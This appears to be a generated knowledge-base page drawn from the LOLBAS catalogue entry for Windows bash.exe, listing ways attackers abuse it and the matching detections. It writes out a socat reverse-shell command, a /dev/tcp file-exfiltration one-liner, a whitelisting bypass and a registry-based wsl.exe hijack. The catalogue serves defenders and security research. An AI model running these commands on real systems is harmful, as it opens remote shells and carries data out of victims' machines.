---
title: "Bash.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Bash.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Bash.exe"
functions:
  - "Execute"
  - "AWL Bypass"
attack_technique_ids:
  - "T1202"
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Bash.exe

File used by Windows subsystem for Linux

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Bash.yml

## Paths

- `C:\Windows\System32\bash.exe`
- `C:\Windows\SysWOW64\bash.exe`

## Commands

### 1. Execute

Executes executable from bash.exe

```cmd
bash.exe -c "{CMD}"
```

- Use Case: Performs execution of specified file, can be used as a defensive evasion.
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 2. Execute

Executes a reverse shell

```cmd
bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
```

- Use Case: Performs execution of specified file, can be used as a defensive evasion.
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 3. Execute

Exfiltrate data

```cmd
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
```

- Use Case: Performs execution of specified file, can be used as a defensive evasion.
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 4. AWL Bypass

Executes executable from bash.exe

```cmd
bash.exe -c "{CMD}"
```

- Use Case: Performs execution of specified file, can be used to bypass Application Whitelisting.
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 5. Execute

When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

```cmd
bash.exe
```

- Use Case: Execute a payload as a child process of `bash.exe` while masquerading as WSL.
- Privileges: User
- Operating System: Windows 10, Windows Server 2019, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Detections

- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
- IOC: Child process from bash.exe

## Resources

- {'Link': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules'}
- {'Link': 'https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/'}

## Acknowledgements

- {'Person': 'Alex Ionescu', 'Handle': '@aionescu'}
- {'Person': 'Asif Matadar', 'Handle': '@d1r4c'}
- {'Person': 'Liran Ravich, CardinalOps'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml)
